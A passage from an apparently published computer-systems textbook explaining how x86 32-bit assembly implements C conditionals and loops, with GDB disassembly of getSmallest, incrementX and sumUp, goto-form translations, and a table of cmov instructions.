<tr>&#13;
<td style="vertical-align: top"><p class="tab"><span class="literal">s</span></p></td>&#13;
<td style="vertical-align: top"><p class="tab">signed</p></td>&#13;
</tr>&#13;
<tr>&#13;
<td style="vertical-align: top"><p class="tab"><span class="literal">g</span></p></td>&#13;
<td style="vertical-align: top"><p class="tab">greater (signed interpretation)</p></td>&#13;
</tr>&#13;
<tr>&#13;
<td style="vertical-align: top"><p class="tab"><span class="literal">l</span></p></td>&#13;
<td style="vertical-align: top"><p class="tab">less (signed interpretation)</p></td>&#13;
</tr>&#13;
<tr>&#13;
<td style="vertical-align: top"><p class="tab"><span class="literal">a</span></p></td>&#13;
<td style="vertical-align: top"><p class="tab">above (unsigned interpretation)</p></td>&#13;
</tr>&#13;
<tr>&#13;
<td style="vertical-align: top"><p class="tab"><span class="literal">b</span></p></td>&#13;
<td style="vertical-align: top"><p class="tab">below (unsigned interpretation)</p></td>&#13;
</tr>&#13;
</table>&#13;
<p class="indent">Sounding it out, we can see that <span class="literal">jg</span> corresponds to <em>jump greater</em> and that its signed synonym <span class="literal">jnl</span> stands for <em>jump not less</em>. Likewise, the unsigned version <span class="literal">ja</span> stands for <em>jump above</em>, while its synonym <span class="literal">jnbe</span> stands for <em>jump not below or equal</em>.</p>&#13;
<p class="indent">If you sound out the instructions, it helps to explain why certain synonyms correspond to particular instructions. The other thing to remember is that the terms <em>greater</em> and <em>less</em> instruct the CPU to interpret the numerical comparison as a signed value, whereas <em>above</em> and <em>below</em> indicate that the numerical comparison is unsigned.</p>&#13;
<h5 class="h5" id="lev3_65">The goto Statement</h5>&#13;
<p class="noindent">In the following subsections, we look at conditionals and loops in assembly and reverse engineer them back to C. When translating assembly code of conditionals and loops back into C, it is useful to understand the corresponding C language <span class="literal">goto</span> forms. The <span class="literal">goto</span> statement is a C primitive that forces program execution to switch to another line in the code. The assembly instruction associated with the <span class="literal">goto</span> statement is <span class="literal">jmp</span>.</p>&#13;
<p class="indent">The <span class="literal">goto</span> statement consists of the <span class="literal">goto</span> keyword followed by a <em>goto label</em>, a type of program label that indicates where execution should continue. So, <span class="literal">goto done</span> means that the program execution should jump to the line marked by label <span class="literal">done</span>. Other examples of program labels in C include the <span class="literal">switch</span> statement labels previously covered in “switch Statements” on <a href="ch02.xhtml#lev2_36">page 122</a>.</p>&#13;
<p class="indent">The following code listings depict a function <span class="literal">getSmallest</span> written in regular C code (first) and its associated <span class="literal">goto</span> form in C (second). The <span class="literal">getSmallest</span> function compares the values of two integers (<span class="literal">x</span> and <span class="literal">y</span>), and assigns the smaller value to variable <span class="literal">smallest</span>.</p>&#13;
<p class="margnote">Regular C version</p>&#13;
<p class="programs">int getSmallest(int x, int y) {<br/>&#13;
    int smallest;<br/>&#13;
    if ( x &gt; y ) { //if (conditional)<br/>&#13;
        smallest = y; //then statement<br/>&#13;
    }<br/>&#13;
<span epub:type="pagebreak" id="page_397"/>&#13;
    else {<br/>&#13;
        smallest = x; //else statement<br/>&#13;
    }<br/>&#13;
    return smallest;<br/>&#13;
}</p>&#13;
<p class="margnote">goto version</p>&#13;
<p class="programs">int getSmallest(int x, int y) {<br/>&#13;
    int smallest;<br/>&#13;
<br/>&#13;
    if (x &lt;= y ) { //if (!conditional)<br/>&#13;
        goto else_statement;<br/>&#13;
    }<br/>&#13;
    smallest = y; //then statement<br/>&#13;
    goto done;<br/>&#13;
<br/>&#13;
else_statement:<br/>&#13;
    smallest = x; //else statement<br/>&#13;
<br/>&#13;
done:<br/>&#13;
    return smallest;<br/>&#13;
}</p>&#13;
<p class="indent">The <span class="literal">goto</span> form of this function may seem counterintuitive, but let’s discuss what exactly is going on. The conditional checks to see whether variable <span class="literal">x</span> is less than or equal to <span class="literal">y</span>.</p>&#13;
<ul>&#13;
<li class="noindent">If <span class="literal">x</span> is less than or equal to <span class="literal">y</span>, the program transfers control to the label marked by <span class="literal">else_statement</span>, which contains the single statement <span class="literal">smallest = x</span>. Since the program executes linearly, the program continues on to execute the code under the label <span class="literal">done</span>, which returns the value of <span class="literal">smallest</span> (<span class="literal">x</span>).</li>&#13;
<li class="noindent">If <span class="literal">x</span> is greater than <span class="literal">y</span>, then <span class="literal">smallest</span> is assigned the value <span class="literal">y</span>. The program then executes the statement <span class="literal">goto done</span>, which transfers control to the <span class="literal">done</span> label, which returns the value of <span class="literal">smallest</span> (<span class="literal">y</span>).</li>&#13;
</ul>&#13;
<p class="indent">Although <span class="literal">goto</span> statements were commonly used in the early days of programming, their use in modern code is considered bad practice because it reduces the overall readability of code. In fact, computer scientist Edsger Dijkstra wrote a famous paper lambasting the use of <span class="literal">goto</span> statements called “Go To Statement Considered Harmful.”<sup><a href="ch08.xhtml#fn8_1" id="rfn8_1">1</a></sup></p>&#13;
<p class="indent">In general, well-designed C programs do not use <span class="literal">goto</span> statements, and programmers are discouraged from using them to avoid writing code that is difficult to read, debug, and maintain. However, the C <span class="literal">goto</span> statement is important to understand, as GCC typically changes C code with conditionals into a <span class="literal">goto</span> form prior to translating it to assembly, including code that contains <span class="literal">if</span> statements and loops.</p>&#13;
<p class="indent">The following subsections cover the assembly representation of <span class="literal">if</span> statements and loops in greater detail.</p>&#13;
<h4 class="h4" id="lev2_149"><span epub:type="pagebreak" id="page_398"/>8.4.2 if Statements in Assembly</h4>&#13;
<p class="noindent">Let’s take a look at the <span class="literal">getSmallest</span> function in assembly. For convenience, the function is reproduced here.</p>&#13;
<p class="programs">&#13;
int getSmallest(int x, int y) {<br/>&#13;
    int smallest;<br/>&#13;
    if ( x &gt; y ) {<br/>&#13;
        smallest = y;<br/>&#13;
    }<br/>&#13;
    else {<br/>&#13;
        smallest = x;<br/>&#13;
    }<br/>&#13;
    return smallest;<br/>&#13;
}</p>&#13;
<p class="noindent">The corresponding assembly code extracted from GDB looks similar to the following:</p>&#13;
<p class="programs">(gdb) <span class="codestrong1">disas getSmallest</span><br/>&#13;
Dump of assembler code for function getSmallest:<br/>&#13;
  0x8048411 &lt;+6&gt;:   mov    0x8(%ebp),%eax<br/>&#13;
  0x8048414 &lt;+9&gt;:   cmp    0xc(%ebp),%eax<br/>&#13;
  0x8048417 &lt;+12&gt;:  jle    0x8048421 &lt;getSmallest+22&gt;<br/>&#13;
  0x8048419 &lt;+14&gt;:  mov    0xc(%ebp),%eax<br/>&#13;
  0x804841f &lt;+20&gt;:  jmp    0x8048427 &lt;getSmallest+28&gt;<br/>&#13;
  0x8048421 &lt;+22&gt;:  mov    0x8(%ebp),%eax<br/>&#13;
  0x8048427 &lt;+28&gt;:  ret</p>&#13;
<p class="indent">This is a different view of the assembly code than we have seen before. Here, we can see the <em>address</em> associated with each instruction, but not the <em>bytes</em>. Note that this assembly segment has been lightly edited for the sake of simplicity. The instructions that are normally part of function creation/termination (i.e., <span class="literal">push %ebp</span> and <span class="literal">mov %esp,%ebp</span>) and for allocating space on the stack are removed. By convention, GCC places the first and second parameters of a function at locations <span class="literal">%ebp+8</span> and <span class="literal">%ebp+0xc</span> (or <span class="literal">%ebp+12</span>), respectively. For the sake of clarity, we refer to these parameters as <span class="literal">x</span> and <span class="literal">y</span>, respectively.</p>&#13;
<p class="indent">Let’s trace through the first few lines of the previous assembly code snippet. Note that we will not draw out the stack explicitly in this example. We leave this as an exercise for the reader, and encourage you to practice your stack tracing skills by drawing it out yourself.</p>&#13;
<ul>&#13;
<li class="noindent">The first <span class="literal">mov</span> instruction copies the value located at address <span class="literal">%ebp+8</span> (the first parameter, <span class="literal">x</span>) and places it in register <span class="literal">%eax</span>. The instruction pointer (<span class="literal">%eip</span>) is set to the address of the next instruction, or 0x08048414.</li>&#13;
<li class="noindent">The <span class="literal">cmp</span> instruction compares the value at location <span class="literal">%ebp+12</span> (the second parameter, <span class="literal">y</span>) to <span class="literal">x</span> and sets appropriate condition code flag registers. Register <span class="literal">%eip</span> advances to the address of the next instruction, or 0x08048417.</li>&#13;
<li class="noindent"><span epub:type="pagebreak" id="page_399"/>The <span class="literal">jle</span> instruction on the third line indicates that if <span class="literal">x</span> is less than or equal to <span class="literal">y</span>, the next instruction that executes is at location <span class="literal">&lt;getSmallest+22&gt;</span> (or <span class="literal">mov 0x8(%ebp),%eax</span>) and that <span class="literal">%eip</span> should be set to address 0x8048421. Otherwise, <span class="literal">%eip</span> is set to the next instruction in sequence, or 0x8048419.</li>&#13;
</ul>&#13;
<p class="indent">The next instructions to execute depend on whether the program follows the branch (i.e., executes the jump) on line 3 (<span class="literal">&lt;getSmallest+12&gt;</span>). Let’s first suppose that the branch was <em>not</em> followed. In this case, <span class="literal">%eip</span> is set to 0x8048419 (i.e., <span class="literal">&lt;getSmallest+14&gt;</span>) and the following sequence of instructions executes:</p>&#13;
<ul>&#13;
<li class="noindent">The <span class="literal">mov 0xc(%ebp),%eax</span> instruction at <span class="literal">&lt;getSmallest+14&gt;</span> copies <span class="literal">y</span> to register <span class="literal">%eax</span>. Register <span class="literal">%eip</span> advances to 0x804841f.</li>&#13;
<li class="noindent">The <span class="literal">jmp</span> instruction sets register <span class="literal">%eip</span> to address 0x8048427.</li>&#13;
<li class="noindent">The last instruction to execute is the <span class="literal">ret</span> instruction, signifying the end of the function. In this case, <span class="literal">%eax</span> contains <span class="literal">y</span>, and <span class="literal">getSmallest</span> returns <span class="literal">y</span>.</li>&#13;
</ul>&#13;
<p class="indent">Now, suppose that the branch was taken at <span class="literal">&lt;getSmallest+12&gt;</span>. In other words, the <span class="literal">jle</span> instruction sets register <span class="literal">%eip</span> to 0x8048421 (i.e., <span class="literal">&lt;getSmallest+22&gt;</span>). Then, the next instructions to execute are:</p>&#13;
<ul>&#13;
<li class="noindent">The <span class="literal">mov 0x8(%ebp),%eax</span> instruction at address 0x8048421, which copies <span class="literal">x</span> to register <span class="literal">%eax</span>. Register <span class="literal">%eip</span> advances to 0x8048427.</li>&#13;
<li class="noindent">The last instruction that executes is <span class="literal">ret</span>, signifying the end of the function. In this case, <span class="literal">%eax</span> contains <span class="literal">x</span>, and <span class="literal">getSmallest</span> returns <span class="literal">x</span>.</li>&#13;
</ul>&#13;
<p class="indent">We can then annotate the preceding assembly as follows:</p>&#13;
<p class="programs">0x8048411 &lt;+6&gt;:  mov 0x8(%ebp),%eax             #copy x to %eax<br/>&#13;
0x8048414 &lt;+9&gt;:  cmp 0xc(%ebp),%eax             #compare x with y<br/>&#13;
0x8048417 &lt;+12&gt;: jle 0x8048421 &lt;getSmallest+22&gt; #if x&lt;=y goto&lt;getSmallest+22&gt;<br/>&#13;
0x8048419 &lt;+14&gt;: mov 0xc(%ebp),%eax             #copy y to %eax<br/>&#13;
0x804841f &lt;+20&gt;: jmp 0x8048427 &lt;getSmallest+28&gt; #goto &lt;getSmallest+28&gt;<br/>&#13;
0x8048421 &lt;+22&gt;: mov 0x8(%ebp),%eax             #copy x to %eax<br/>&#13;
0x8048427 &lt;+28&gt;: ret                            #exit function (return %eax)</p>&#13;
<p class="indent">Translating this back to C code yields:</p>&#13;
<p class="margnote">goto form</p>&#13;
<p class="programs">int getSmallest(int x, int y) {<br/>&#13;
    int smallest;<br/>&#13;
    if (x &lt;= y) {<br/>&#13;
        goto assign_x;<br/>&#13;
    }<br/>&#13;
    smallest = y;<br/>&#13;
    goto done;<br/>&#13;
<br/>&#13;
assign_x:<br/>&#13;
    smallest = x;<br/>&#13;
<br/>&#13;
<span epub:type="pagebreak" id="page_400"/>&#13;
done:<br/>&#13;
    return smallest;<br/>&#13;
}</p>&#13;
<p class="margnote">Translated C code</p>&#13;
<p class="programs">int getSmallest(int x, int y) {<br/>&#13;
    int smallest;<br/>&#13;
    if (x &lt;= y) {<br/>&#13;
        smallest = x;<br/>&#13;
    }<br/>&#13;
    else {<br/>&#13;
        smallest = y;<br/>&#13;
    }<br/>&#13;
    return smallest;<br/>&#13;
}</p>&#13;
<p class="indent">In these code listings, the variable <span class="literal">smallest</span> corresponds to register <span class="literal">%eax</span>. If <span class="literal">x</span> is less than or equal to <span class="literal">y</span>, the code executes the statement <span class="literal">smallest = x</span>, which is associated with the <span class="literal">goto</span> label <span class="literal">assign_x</span> in our <span class="literal">goto</span> form of this function. Otherwise, the statement <span class="literal">smallest = y</span> is executed. The <span class="literal">goto</span> label <span class="literal">done</span> is used to indicate that the value in <span class="literal">smallest</span> should be returned.</p>&#13;
<p class="indent">Notice that the preceding C translation of the assembly code is a bit different from the original <span class="literal">getSmallest</span> function. These differences don’t matter; a close inspection of both functions reveals that the two programs are logically equivalent. However, the compiler first converts any <span class="literal">if</span> statementinto an equivalent <span class="literal">goto</span> form, which results in the slightly different, but equivalent, version. The following code examples show the standard <span class="literal">if</span> statement format and its equivalent <span class="literal">goto</span> form:</p>&#13;
<p class="margnote">C if statement</p>&#13;
<p class="programs">if (&lt;<span class="codeitalic1">condition</span>&gt;) {<br/>&#13;
    &lt;<span class="codeitalic1">then_statement</span>&gt;;<br/>&#13;
}<br/>&#13;
else {<br/>&#13;
    &lt;<span class="codeitalic1">else_statement</span>&gt;;<br/>&#13;
}</p>&#13;
<p class="margnote">Compiler’s equivalent goto form</p>&#13;
<p class="programs">    if (!&lt;<span class="codeitalic1">condition</span>&gt;) {<br/>&#13;
        goto else;<br/>&#13;
    }<br/>&#13;
    &lt;<span class="codeitalic1">then_statement</span>&gt;;<br/>&#13;
    goto done;<br/>&#13;
else:<br/>&#13;
    &lt;<span class="codeitalic1">else_statement</span>&gt;;<br/>&#13;
done:</p>&#13;
<p class="indent">Compilers translating code into assembly designate a jump when a condition is true. Contrast this behavior with the structure of an <span class="literal">if</span> statement, <span epub:type="pagebreak" id="page_401"/>where a “jump” (to the <span class="literal">else</span>) occurs when conditions are <em>not</em> true. The <span class="literal">goto</span> form captures this difference in logic.</p>&#13;
<p class="indent">Considering the original <span class="literal">goto</span> translation of the <span class="literal">getSmallest</span> function, we can see that:</p>&#13;
<ul>&#13;
<li class="noindent"><span class="literal">x &gt;= y</span> corresponds to <span class="literal">!<em>&lt;condition&gt;</em></span>.</li>&#13;
<li class="noindent"><span class="literal">smallest = x</span> is the <span class="literal"/> <span class="codeitalic">&lt;else_statement&gt;</span>.</li>&#13;
<li class="noindent">The line <span class="literal">smallest = y</span> is the <span class="literal"/> <span class="codeitalic">&lt;then_statement&gt;</span>.</li>&#13;
<li class="noindent">The last line in the function is <span class="literal">return smallest</span>.</li>&#13;
</ul>&#13;
<p class="indent">Rewriting the original version of the function with the preceding annotations yields:</p>&#13;
<p class="programs">&#13;
int getSmallest(int x, int y) {<br/>&#13;
    int smallest;<br/>&#13;
    if (x &gt; y) {     //!(x &lt;= y)<br/>&#13;
        smallest = y; //then_statement<br/>&#13;
    }<br/>&#13;
    else {<br/>&#13;
        smallest = x; //else_statement<br/>&#13;
    }<br/>&#13;
    return smallest;<br/>&#13;
}</p>&#13;
<p class="indent">This version is identical to the original <span class="literal">getSmallest</span> function. Keep in mind that a function written in different ways in the C language can translate to the same set of assembly instructions.</p>&#13;
<h5 class="h5" id="lev3_66">The cmov Instructions</h5>&#13;
<p class="noindent">The last set of conditional instructions we cover are <em>conditional move</em> (<span class="literal">cmov</span>) instructions. The <span class="literal">cmp</span>, <span class="literal">test</span>, and <span class="literal">jmp</span> instructions implement a <em>conditional transfer of control</em> in a program. In other words, the execution of the program branches in many directions. This can be very problematic for optimizing code because these branches are very expensive.</p>&#13;
<p class="indent">In contrast, the <span class="literal">cmov</span> instruction implements a <em>conditional transfer of data</em>. In other words, both the <span class="literal"/> <span class="codeitalic">&lt;then_statement&gt;</span> and <span class="literal"/> <span class="codeitalic">&lt;else_statement&gt;</span> of the conditional are executed, and the data is placed in the appropriate register based on the result of the condition.</p>&#13;
<p class="indent">The use of C’s <em>ternary expression</em> often results in the compiler generating a <span class="literal">cmov</span> instruction in place of jumps. For the standard if–then–else statement, the ternary expression has the form:</p>&#13;
<p class="programs">result = ( <span class="codeitalic1">&lt;condition&gt;</span>) ? <span class="codeitalic1">&lt;then_statement&gt;</span> : <span class="codeitalic1">&lt;else_statement&gt;</span>;</p>&#13;
<p class="indent">Let’s use this format to rewrite the <span class="literal">getSmallest</span> function as a ternary expression. Keep in mind that this new version of the function behaves exactly as the original <span class="literal">getSmallest</span> function:</p>&#13;
<p class="programs">int getSmallest_cmov(int x, int y) {<br/>&#13;
<span epub:type="pagebreak" id="page_402"/>&#13;
    return x &gt; y ? y : x;<br/>&#13;
}</p>&#13;
<p class="indent">Although this may not seem like a big change, let’s look at the resulting assembly. Recall that the first and second parameters (<span class="literal">x</span> and <span class="literal">y</span>) are stored at stack addresses <span class="literal">%ebp</span> + 0x8 and <span class="literal">%ebp</span> + 0xc, respectively.</p>&#13;
<p class="programs">0x08048441 &lt;+0&gt;:   push   %ebp              #save ebp<br/>&#13;
0x08048442 &lt;+1&gt;:   mov    %esp,%ebp         #update ebp<br/>&#13;
0x08048444 &lt;+3&gt;:   mov    0xc(%ebp),%eax    #copy y to %eax<br/>&#13;
0x08048447 &lt;+6&gt;:   cmp    %eax,0x8(%ebp)    #compare x with y<br/>&#13;
0x0804844a &lt;+9&gt;:   cmovle 0x8(%ebp),%eax    #if (x &lt;= y) copy x to %eax<br/>&#13;
0x0804844e &lt;+13&gt;:  pop    %ebp              #restore %ebp<br/>&#13;
0x0804844f &lt;+14&gt;:  ret                      #return %eax</p>&#13;
<p class="indent">This assembly code has no jumps. After the comparison of <span class="literal">x</span> and <span class="literal">y</span>, <span class="literal">x</span> moves into the return register only if <span class="literal">x</span> is less than or equal to <span class="literal">y</span>. Like the jump instructions, the suffix of the <span class="literal">cmov</span> instructions indicates the condition on which the conditional move occurs. <a href="ch08.xhtml#ch8tab15">Table 8-15</a> lists the set of conditional move instructions.</p>&#13;
<p class="tabcap" id="ch8tab15"><strong>Table 8-15:</strong> The cmov Instructions</p>&#13;
<table class="line">&#13;
<colgroup>&#13;
<col style="width:30%"/>&#13;
<col style="width:20%"/>&#13;
<col style="width:50%"/>&#13;
</colgroup>&#13;
<tr class="borderb">&#13;
<td style="vertical-align: top"><p class="tab"><strong>Signed</strong></p></td>&#13;
<td style="vertical-align: top"><p class="tab"><strong>Unsigned</strong></p></td>&#13;
<td style="vertical-align: top"><p class="tab"><strong>Description</strong></p></td>&#13;
</tr>&#13;
<tr>&#13;
<td style="vertical-align: top"><p class="tab"><span class="literal">cmove</span> (<span class="literal">cmovz</span>)</p></td>&#13;
<td style="vertical-align: top"><p class="tab"/></td>&#13;
<td style="vertical-align: top"><p class="tab">move if equal (==)</p></td>&#13;
</tr>&#13;
<tr>&#13;
<td style="vertical-align: top"><p class="tab"><span class="literal">cmovne</span> (<span class="literal">cmovnz</span>)</p></td>&#13;
<td style="vertical-align: top"><p class="tab"/></td>&#13;
<td style="vertical-align: top"><p class="tab">move if not equal (!=)</p></td>&#13;
</tr>&#13;
<tr>&#13;
<td style="vertical-align: top"><p class="tab"><span class="literal">cmovs</span></p></td>&#13;
<td style="vertical-align: top"><p class="tab"/></td>&#13;
<td style="vertical-align: top"><p class="tab">move if negative</p></td>&#13;
</tr>&#13;
<tr>&#13;
<td style="vertical-align: top"><p class="tab"><span class="literal">cmovns</span></p></td>&#13;
<td style="vertical-align: top"><p class="tab"/></td>&#13;
<td style="vertical-align: top"><p class="tab">move if non-negative</p></td>&#13;
</tr>&#13;
<tr>&#13;
<td style="vertical-align: top"><p class="tab"><span class="literal">cmovg</span> (<span class="literal">cmovnle</span>)</p></td>&#13;
<td style="vertical-align: top"><p class="tab"><span class="literal">cmova</span> (<span class="literal">cmovnbe</span>)</p></td>&#13;
<td style="vertical-align: top"><p class="tab">move if greater (&gt;)</p></td>&#13;
</tr>&#13;
<tr>&#13;
<td style="vertical-align: top"><p class="tab"><span class="literal">cmovge</span> (<span class="literal">cmovnl</span>)</p></td>&#13;
<td style="vertical-align: top"><p class="tab"><span class="literal">cmovae</span> (<span class="literal">cmovnb</span>)</p></td>&#13;
<td style="vertical-align: top"><p class="tab">move if greater than or equal (&gt;=)</p></td>&#13;
</tr>&#13;
<tr>&#13;
<td style="vertical-align: top"><p class="tab"><span class="literal">cmovl</span> (<span class="literal">cmovnge</span>)</p></td>&#13;
<td style="vertical-align: top"><p class="tab"><span class="literal">cmovb</span> (<span class="literal">cmovnae</span>)</p></td>&#13;
<td style="vertical-align: top"><p class="tab">move if less (&lt;)</p></td>&#13;
</tr>&#13;
<tr>&#13;
<td style="vertical-align: top"><p class="tab"><span class="literal">cmovle</span> (<span class="literal">cmovng</span>)</p></td>&#13;
<td style="vertical-align: top"><p class="tab"><span class="literal">cmovbe</span> (<span class="literal">cmovna</span>)</p></td>&#13;
<td style="vertical-align: top"><p class="tab">move if less than or equal (&lt;=)</p></td>&#13;
</tr>&#13;
</table>&#13;
<p class="indent">The compiler is very cautious about converting jump instructions into <span class="literal">cmov</span> instructions, especially in cases where side effects and pointer values are involved. Here, we show two equivalent ways of writing a function, <span class="literal">incrementX</span>:</p>&#13;
<p class="margnote">C code</p>&#13;
<p class="programs">int incrementX(int * x) {<br/>&#13;
    if (x != NULL) { //if x is not NULL<br/>&#13;
        return (*x)++; //increment x<br/>&#13;
    }<br/>&#13;
    else { //if x is NULL<br/>&#13;
        return 1; //return 1<br/>&#13;
    }<br/>&#13;
}</p>&#13;
<span epub:type="pagebreak" id="page_403"/>&#13;
<p class="margnote">C ternary form</p>&#13;
<p class="programs">int incrementX2(int * x){<br/>&#13;
    return x ? (*x)++ : 1;<br/>&#13;
}</p>&#13;
<p class="indent">Each function takes a pointer to an integer as input and checks whether it is <span class="literal">NULL</span>. If <span class="literal">x</span> is not <span class="literal">NULL</span>, the function increments and returns the dereferenced value of <span class="literal">x</span>. Otherwise, the function returns the value 1.</p>&#13;
<p class="indent">It is tempting to think that <span class="literal">incrementX2</span> uses a <span class="literal">cmov</span> instruction because it uses a ternary expression. However, both functions yield the exact same assembly code:</p>&#13;
<p class="programs">0x80484cf &lt;+0&gt;:   push   %ebp<br/>&#13;
0x80484d0 &lt;+1&gt;:   mov    %esp,%ebp<br/>&#13;
0x80484d2 &lt;+3&gt;:   cmpl   $0x0,0x8(%ebp)<br/>&#13;
0x80484d6 &lt;+7&gt;:   je     0x80484e7 &lt;incrementX2+24&gt;<br/>&#13;
0x80484d8 &lt;+9&gt;:   mov    0x8(%ebp),%eax<br/>&#13;
0x80484db &lt;+12&gt;:  mov    (%eax),%eax<br/>&#13;
0x80484dd &lt;+14&gt;:  lea    0x1(%eax),%ecx<br/>&#13;
0x80484e0 &lt;+17&gt;:  mov    0x8(%ebp),%edx<br/>&#13;
0x80484e3 &lt;+20&gt;:  mov    %ecx,(%edx)<br/>&#13;
0x80484e5 &lt;+22&gt;:  jmp    0x80484ec &lt;incrementX2+29&gt;<br/>&#13;
0x80484e7 &lt;+24&gt;:  mov    $0x1,%eax<br/>&#13;
0x80484ec &lt;+29&gt;:  pop    %ebp<br/>&#13;
0x80484ed &lt;+30&gt;:  ret</p>&#13;
<p class="indent">Recall that the <span class="literal">cmov</span> instruction <em>executes both branches of the conditional</em>. In other words, <span class="literal">x</span> gets dereferenced no matter what. Consider the case where <span class="literal">x</span> is a null pointer. Recall that dereferencing a null pointer leads to a null pointer exception in the code, causing a segmentation fault. To prevent any chance of this happening, the compiler takes the safe road and uses jumps.</p>&#13;
<h4 class="h4" id="lev2_150">8.4.3 Loops in Assembly</h4>&#13;
<p class="noindent">Like <span class="literal">if</span> statements, loops in assembly are also implemented using jump instructions. However, loops enable instructions to be <em>revisited</em> based on the result of an evaluated condition.</p>&#13;
<p class="indent">The <span class="literal">sumUp</span> function shown in the following example sums up all the positive integers from 1 to a user-defined integer. This code is intentionally written suboptimally to illustrate a <span class="literal">while</span> loop in C.</p>&#13;
<p class="programs">int sumUp(int n) {<br/>&#13;
    //initialize total and i<br/>&#13;
    int total = 0;<br/>&#13;
    int i = 1;<br/>&#13;
<br/>&#13;
    while (i &lt;= n) {  //while i is less than or equal to n<br/>&#13;
        total += i;   //add i to total<br/>&#13;
        i+=1;          //increment i by 1<br/>&#13;
<span epub:type="pagebreak" id="page_404"/>&#13;
    }<br/>&#13;
    return total;<br/>&#13;
}</p>&#13;
<p class="indent">Compiling this code with the <span class="literal">-m32</span> option and disassembling it using GDB yields the following assembly code:</p>&#13;
<p class="programs">(gdb) disas sumUp<br/>&#13;
Dump of assembler code for function sumUp:<br/>&#13;
  0x804840b &lt;+0&gt;:   push   %ebp<br/>&#13;
  0x804840c &lt;+1&gt;:   mov    %esp,%ebp<br/>&#13;
  0x804840e &lt;+3&gt;:   sub    $0x10,%esp<br/>&#13;
  0x8048411 &lt;+6&gt;:   movl   $0x0,-0x8(%ebp)<br/>&#13;
  0x8048418 &lt;+13&gt;:  movl   $0x1,-0x4(%ebp)<br/>&#13;
  0x804841f &lt;+20&gt;:  jmp    0x804842b &lt;sumUp+32&gt;<br/>&#13;
  0x8048421 &lt;+22&gt;:  mov    -0x4(%ebp),%eax<br/>&#13;
  0x8048424 &lt;+25&gt;:  add    %eax,-0x8(%ebp)<br/>&#13;
  0x8048427 &lt;+28&gt;:  add   $0x1,-0x4(%ebp)<br/>&#13;
  0x804842b &lt;+32&gt;:  mov    -0x4(%ebp),%eax<br/>&#13;
  0x804842e &lt;+35&gt;:  cmp    0x8(%ebp),%eax<br/>&#13;
  0x8048431 &lt;+38&gt;:  jle    0x8048421 &lt;sumUp+22&gt;<br/>&#13;
  0x8048433 &lt;+40&gt;:  mov    -0x8(%ebp),%eax<br/>&#13;
  0x8048436 &lt;+43&gt;:  leave<br/>&#13;
  0x8048437 &lt;+44&gt;:  ret</p>&#13;
<p class="indent">Again, we will not draw out the stack explicitly in this example. However, we encourage readers to draw the stack out themselves.</p>&#13;
<h5 class="h5" id="lev3_67">The First Five Instructions</h5>&#13;
<p class="noindent">The first five instructions of this function prepare the stack for function execution:</p>&#13;
<p class="programs">0x804840b &lt;+0&gt;:   push   %ebp                 # save ebp on stack<br/>&#13;
0x804840c &lt;+1&gt;:   mov    %esp,%ebp            # update ebp (new stack frame)<br/>&#13;
0x804840e &lt;+3&gt;:   sub    $0x10,%esp           # add 16 bytes to stack frame<br/>&#13;
0x8048411 &lt;+6&gt;:   movl   $0x0,-0x8(%ebp)      # place 0 at ebp-0x8 (total)<br/>&#13;
0x8048418 &lt;+13&gt;:  movl   $0x1,-0x4(%ebp)      # place 1 at ebp-0x4 (i)</p>&#13;
<p class="indent">Recall that stack locations store <em>temporary variables</em> in a function. For simplicity we will refer to the location marked by <span class="literal">%ebp - 0x8</span> as <span class="literal">total</span>, and <span class="literal">%ebp - 0x4</span> as <span class="literal">i</span>. The input parameter to <span class="literal">sumUp</span> is located at <span class="literal">%ebp</span> + 0x8.</p>&#13;
<h5 class="h5" id="lev3_68">The Heart of the Loop</h5>&#13;
<p class="noindent">The next seven instructions in the <span class="literal">sumUp</span> function represent the heart of the loop:</p>&#13;
<p class="programs">0x804841f &lt;+20&gt;:  jmp    0x804842b &lt;sumUp+32&gt;  # goto &lt;sumUp+32&gt;<br/>&#13;
0x8048421 &lt;+22&gt;:  mov    -0x4(%ebp),%eax       # copy i to eax<br/>&#13;
0x8048424 &lt;+25&gt;:  add    %eax,-0x8(%ebp)       # add i to total (total+=i)<br/>&#13;
<span epub:type="pagebreak" id="page_405"/>&#13;
0x8048427 &lt;+28&gt;:  add    $0x1,-0x4(%ebp)       # add 1 to i (i+=1)<br/>&#13;
0x804842b &lt;+32&gt;:  mov    -0x4(%ebp),%eax       # copy i to eax<br/>&#13;
0x804842e &lt;+35&gt;:  cmp    0x8(%ebp),%eax        # compare i with n<br/>&#13;
0x8048431 &lt;+38&gt;:  jle    0x8048421 &lt;sumUp+22&gt;  # if (i &lt;= n) goto &lt;sumUp+22&gt;</p>&#13;
<p class="indent">The first instruction is a direct jump to <span class="literal">&lt;sumUp+32&gt;</span>, which sets the instruction pointer (<span class="literal">%eip</span>) to address 0x804842b.</p>&#13;
<p class="indent">The next instructions that execute (<span class="literal">&lt;sumUp+32&gt;</span> and <span class="literal">&lt;sumUp+35&gt;</span>) copy the value of <span class="literal">i</span> to register <span class="literal">%eax</span> and compare <span class="literal">i</span> with the first parameter to the <span class="literal">sumUp</span> function (or <span class="literal">n</span>). The <span class="literal">cmp</span> instruction sets the appropriate condition codes in preparation for the <span class="literal">jle</span> instruction at <span class="literal">&lt;sumUp+38&gt;</span>.</p>&#13;
<p class="indent">The <span class="literal">jle</span> instruction at <span class="literal">&lt;sumUp+38&gt;</span> then executes. If <span class="literal">i</span> is less than or equal to <span class="literal">n</span>, the branch is taken and program execution jumps to <span class="literal">&lt;sumUp+22&gt;</span>, and <span class="literal">%eip</span> is set to 0x8048421. The following instructions then execute in sequence:</p>&#13;
<ul>&#13;
<li class="noindent"><span class="literal">mov -0x4(%ebp),%eax</span> copies <span class="literal">i</span> to register <span class="literal">%eax</span>.</li>&#13;
<li class="noindent"><span class="literal">add %eax,-0x8(%ebp)</span> adds <span class="literal">i</span> to <span class="literal">total</span> (i.e., <span class="literal">total+=i</span>).</li>&#13;
<li class="noindent"><span class="literal">add $0x1,-0x4(%ebp)</span> increments <span class="literal">i</span> by 1 (i.e., <span class="literal">i+=1</span>).</li>&#13;
<li class="noindent"><span class="literal">mov -0x4(%ebp),%eax</span> copies <span class="literal">i</span> to register <span class="literal">%eax</span>.</li>&#13;
<li class="noindent"><span class="literal">cmp 0x8(%ebp),%eax</span> compares <span class="literal">i</span> to <span class="literal">n</span>.</li>&#13;
<li class="noindent"><span class="literal">jle 0x8048421 &lt;sumUp+22&gt;</span> jumps back to the beginning of this instruction sequence if <span class="literal">i</span> is less than or equal to <span class="literal">n</span>.</li>&#13;
</ul>&#13;
